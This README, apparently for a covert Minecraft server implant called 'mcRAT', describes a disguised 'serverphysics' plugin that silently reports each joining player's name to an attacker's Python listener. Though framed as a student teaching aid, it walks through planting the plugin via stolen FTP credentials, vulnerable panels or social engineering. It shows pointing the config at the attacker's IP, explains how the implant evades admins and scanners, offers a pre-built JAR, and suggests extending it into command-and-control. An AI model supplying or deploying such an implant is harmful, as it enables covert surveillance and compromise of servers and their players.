# mcRAT - Minecraft Network Listener Example

A teaching example for cybersecurity students that demonstrates basic network communication concepts using a Minecraft server plugin and a Python socket listener. This project is designed to illustrate how TCP socket connections, event-driven programming, and client-server communication work in practice.

**This is strictly for educational use in controlled lab environments. Do not deploy this on networks or servers you do not own.**

## What This Demonstrates

- Bukkit/Paper plugin event handling (listening for player join events)
- Establishing outbound TCP connections from a Java application
- A Python socket server that accepts and displays incoming connections
- Basic threading for handling multiple concurrent clients
- The anatomy of a simple command-and-control communication pattern

## Project Structure

```
mcRAT/
├── serverphysics.java        # Bukkit plugin (Java) - connects to listener on player join
├── serverphysics.jar         # Pre-built plugin JAR (compiled for MC 26.2 / Java 25)
├── wizardlistener.py         # Socket listener (Python) - receives and displays connections
├── MANIFEST.MF               # JAR manifest for the compiled plugin
├── src/main/resources/
│   ├── plugin.yml            # Bukkit plugin descriptor
│   └── config.yml            # Default config (target-ip, target-port)
└── lib/
    ├── paper-api-26.2.jar    # Paper API 26.2
    ├── adventure-api.jar     # Adventure text library (transitive dep)
    ├── adventure-key.jar     # Adventure key library (transitive dep)
    └── annotations.jar       # JetBrains annotations (transitive dep)
```

## Prerequisites

- Java Development Kit (JDK 25+)
- Python 3.x
- A Paper or Spigot Minecraft server (version 26.2)
- Two machines on the same network (or a public IP for the listener)

## How the Attack Works (Step by Step)

This section walks through exactly how an attacker would set up and use this tool against a Minecraft server they control. The goal is to silently monitor every player that joins.

### Step 1: Attacker starts the listener

On their own machine, the attacker runs the Python listener. This opens a port and waits for incoming connections:

```bash
python3 wizardlistener.py
```

The listener prints its own IP address on startup:

```
=========================================
  serverphysics listener
  Listening on port 5002
  Your IP: 192.168.1.50
  Set this in plugins/serverphysics/config.yml
=========================================

[*] Listening on 0.0.0.0:5002...
```

The attacker now knows their IP is `192.168.1.50` and their listener is waiting on port `5002`.

### Step 2: Attacker compromises the server's plugins folder

The attacker needs to place `serverphysics.jar` into the Minecraft server's `plugins/` directory. This could happen through:

- Compromised FTP/SFTP credentials for the server
- A vulnerable web panel (like Pterodactyl) with file upload access
- Social engineering the server owner into installing a "performance plugin"
- Shared hosting where the attacker has access to the file system

Once the JAR is in `plugins/`, Paper detects it on the next server start (or `/reload`).

### Step 3: Attacker configures the connection target

When the plugin first loads, Paper auto-generates `plugins/serverphysics/config.yml`:

```yaml
target-ip: "127.0.0.1"
target-port: 5002
```

The attacker edits this file to point at their listener:

```yaml
target-ip: "192.168.1.50"
target-port: 5002
```

After this, the server needs to be restarted (or `/reload` executed) for the config to take effect.

### Step 4: Victim players join the server

Every time a player joins the Minecraft server, the plugin catches the `PlayerJoinEvent`, opens a TCP socket to the attacker's listener, and sends:

```
PLAYER_CONNECTED:<playername>
```

### Step 5: Attacker receives the data

Back on the attacker's machine, the listener prints:

```
=== RECEIVED MESSAGE ===
From 192.168.1.100:49832 -> Message: PLAYER_CONNECTED:Steve
=======================
```

The attacker now knows exactly who is connecting to the server and when, without the server owner or players having any indication.

### What makes this stealthy

- No console messages visible to the server owner (the plugin only logs to its own logger, which most admins don't monitor)
- The connection is a single outbound TCP packet per join event -- easy to miss in network traffic
- No commands are executed on the server, so anti-cheat and exploit scanners won't flag it
- The plugin loads and appears in the plugin list with a generic name ("serverphysics")

## Configuration

The plugin reads its settings from `plugins/serverphysics/config.yml` (auto-generated on first load):

```yaml
target-ip: "127.0.0.1"   # IP of the machine running wizardlistener.py
target-port: 5002         # Port the listener is bound to
```

## Building the Plugin JAR

A pre-built `serverphysics.jar` is included. To rebuild from source:

```bash
export JAVA_HOME=/usr/lib/jvm/java-26-openjdk
CP="lib/paper-api-26.2.jar:lib/adventure-api.jar:lib/adventure-key.jar:lib/annotations.jar"

mkdir -p out/com/example/wizard
cp serverphysics.java /tmp/InfectedServer.java
$JAVA_HOME/bin/javac --release 25 -cp "$CP" -d out /tmp/InfectedServer.java

mkdir -p out
cp src/main/resources/plugin.yml out/
cp src/main/resources/config.yml out/
$JAVA_HOME/bin/jar cmf MANIFEST.MF serverphysics.jar -C out com/ -C out plugin.yml -C out config.yml
rm -rf out /tmp/InfectedServer.java
```

## Extending This Example

Students can extend this project by:

- Adding command parsing on the listener side to send instructions back to the plugin
- Implementing encrypted communication (e.g., wrapping the socket in TLS)
- Adding authentication so only authorized listeners can connect
- Logging connection events to a file or database
- Exploring how real-world C2 frameworks handle persistence and encryption

## Disclaimer

This project exists solely as a teaching aid for understanding network security concepts. It should only be used in authorized educational settings such as CTF competitions, cybersecurity courses, or isolated lab environments. The authors are not responsible for misuse.
